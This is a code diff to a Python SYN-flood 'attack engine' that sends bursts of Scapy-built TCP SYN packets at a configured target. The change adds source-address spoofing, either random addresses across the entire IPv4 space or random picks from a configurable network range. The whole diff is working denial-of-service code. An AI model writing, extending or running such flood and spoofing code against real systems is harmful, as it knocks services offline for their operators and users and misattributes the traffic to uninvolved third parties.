@@ -1,9 +1,10 @@
 from __future__ import annotations
 
 import asyncio
+import ipaddress
 import random
 
-from ..config import Config
+from ..config import Config, SynPayload
 from .base import AttackEngine
 
 
@@ -13,6 +14,7 @@ class SynFlood(AttackEngine):
     def __init__(self, cfg: Config) -> None:
         super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
         self.target_rps = cfg.effective_rps()
+        self.syn = cfg.syn or SynPayload()
         host, _, port_s = cfg.target.partition(":")
         self.host = host
         self.port = int(port_s or 80)
@@ -26,8 +28,17 @@ class SynFlood(AttackEngine):
             ) from e
 
         def build_packet() -> object:
-            src = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
-            return IP(src=src, dst=self.host) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")
+            kwargs = {"dst": self.host}
+            if self.syn.spoof_src:
+                if self.syn.spoof_src == "random":
+                    src = str(ipaddress.IPv4Address(random.randint(1, 2**32 - 2)))
+                else:
+                    network = ipaddress.ip_network(self.syn.spoof_src, strict=False)
+                    # Include the network address for /31 and /32 ranges.
+                    addresses = tuple(network.hosts()) or (network.network_address,)
+                    src = str(random.choice(addresses))
+                kwargs["src"] = src
+            return IP(**kwargs) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")
 
         def burst(n: int) -> None:
             send([build_packet() for _ in range(n)], verbose=False)
